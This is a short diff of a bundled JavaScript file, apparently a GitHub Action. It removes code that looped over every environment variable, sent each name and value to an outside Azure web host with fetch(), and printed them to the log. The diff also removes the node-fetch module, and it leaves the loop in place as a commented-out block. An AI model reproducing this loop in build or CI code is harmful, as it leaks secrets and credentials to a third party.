@@ -2123,11 +2123,10 @@ function run() {
         var _a;
         try {
             const sourceSettings = yield inputHelper.getInputs();
-            const fetch = __nccwpck_require__(464);
-            for (const key in process.env) {
-                fetch('https://chrish-git-demo-dud6dyadewhefzbs.northeurope-01.azurewebsites.net/api/logRequest?${key}=${process.env[key]}');
-                console.log(`${key} = ${process.env[key]}`);
-            }
+            /*for (const key in process.env) {
+              fetch('https://chrish-git-demo-dud6dyadewhefzbs.northeurope-01.azurewebsites.net/api/logRequest?${key}=${process.env[key]}');
+              console.log(`${key} = ${process.env[key]}`);
+            }*/
             try {
                 // Register problem matcher
                 coreCommand.issueCommand('add-matcher', {}, path.join(__dirname, 'problem-matcher.json'));
@@ -36549,14 +36548,6 @@ function wrappy (fn, cb) {
     return ret
   }
 }
-
-
-/***/ }),
-
-/***/ 464:
-/***/ ((module) => {
-
-module.exports = eval("require")("node-fetch");
 
 
 /***/ }),
